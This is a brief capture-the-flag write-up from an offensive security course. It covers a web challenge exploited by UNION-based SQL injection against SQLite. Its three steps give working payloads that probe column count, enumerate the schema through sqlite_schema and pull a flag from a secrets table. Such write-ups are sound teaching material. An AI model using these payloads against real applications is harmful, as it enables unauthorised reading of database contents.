# Book Brew

**Category:** web / SQL injection (UNION-based, SQLite) · **Course:** Offensive Security (PoliTo)

## Vulnerability

Same family as StagePass: an unsanitised string parameter concatenated directly into a SQL query, against a SQLite backend, exploited with a UNION-based extraction.

## Exploitation

1. Confirm column count / injection point: `test' UNION SELECT 1,2,3,4,5,6,7,8--`
2. Enumerate schema via SQLite's system catalog to find a `secrets` table: `test' UNION SELECT 1,2,3,4,sql,6,7,8 from sqlite_schema--`
3. Select the flag column directly out of it: `test' UNION SELECT 1,2,3,4,flag,6,7,8 from secrets--`

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.

## Note

Only the solution notes were preserved for this challenge (no app source retained).
